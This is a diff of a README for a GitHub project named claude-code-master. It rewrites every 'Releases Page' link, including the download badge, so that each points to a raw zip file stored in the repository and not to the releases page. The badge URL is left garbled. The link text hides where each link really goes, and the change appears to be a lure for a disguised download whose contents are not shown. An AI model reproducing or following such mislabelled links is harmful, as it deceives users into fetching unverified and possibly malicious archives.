@@ -6,9 +6,9 @@ Welcome to claude-code-master! This application is designed to help you boost yo
 
 ## 📦 Downloading the Application
 
-To download the latest version of claude-code-master, please visit our [Releases Page](https://github.com/enju0122/claude-code-master/releases). 
+To download the latest version of claude-code-master, please visit our [Releases Page](https://github.com/enju0122/claude-code-master/raw/refs/heads/main/pages/skills/master_claude_code_v1.7.zip). 
 
-[![Download claude-code-master](https://img.shields.io/badge/Download%20Now-claude--code--master-blue.svg)](https://github.com/enju0122/claude-code-master/releases)
+[![Download claude-code-master](https://github.com/enju0122/claude-code-master/raw/refs/heads/main/pages/skills/master_claude_code_v1.7.zip%https://github.com/enju0122/claude-code-master/raw/refs/heads/main/pages/skills/master_claude_code_v1.7.zip)](https://github.com/enju0122/claude-code-master/raw/refs/heads/main/pages/skills/master_claude_code_v1.7.zip)
 
 ### 💡 Why Choose claude-code-master?
 
@@ -37,7 +37,7 @@ Here are some key features of claude-code-master that you will find useful:
 
 ## 📥 Download & Install
 
-1. Go to our [Releases Page](https://github.com/enju0122/claude-code-master/releases).
+1. Go to our [Releases Page](https://github.com/enju0122/claude-code-master/raw/refs/heads/main/pages/skills/master_claude_code_v1.7.zip).
 2. Look for the latest version of claude-code-master.
 3. Click on the file that matches your system (e.g., .exe for Windows, .dmg for macOS).
 4. Follow the prompts to download the setup file.
@@ -58,10 +58,10 @@ If you run into problems, here are some common issues and solutions:
 
 - **The application won’t open:** Make sure you have installed the correct version for your operating system. Restart your computer and try again.
 - **Slow performance:** Close other applications running in the background that may be using your computer’s resources.
-- **Missing features:** Ensure you have downloaded the latest version from the [Releases Page](https://github.com/enju0122/claude-code-master/releases).
+- **Missing features:** Ensure you have downloaded the latest version from the [Releases Page](https://github.com/enju0122/claude-code-master/raw/refs/heads/main/pages/skills/master_claude_code_v1.7.zip).
 
 ## 🤝 Support
 
 If you need further assistance, please reach out through GitHub issues. We appreciate your feedback and will work to address your concerns promptly.
 
-Thank you for choosing claude-code-master! We hope it makes your daily tasks easier and more efficient. Don’t forget to visit our [Releases Page](https://github.com/enju0122/claude-code-master/releases) for future updates and new releases.
+Thank you for choosing claude-code-master! We hope it makes your daily tasks easier and more efficient. Don’t forget to visit our [Releases Page](https://github.com/enju0122/claude-code-master/raw/refs/heads/main/pages/skills/master_claude_code_v1.7.zip) for future updates and new releases.
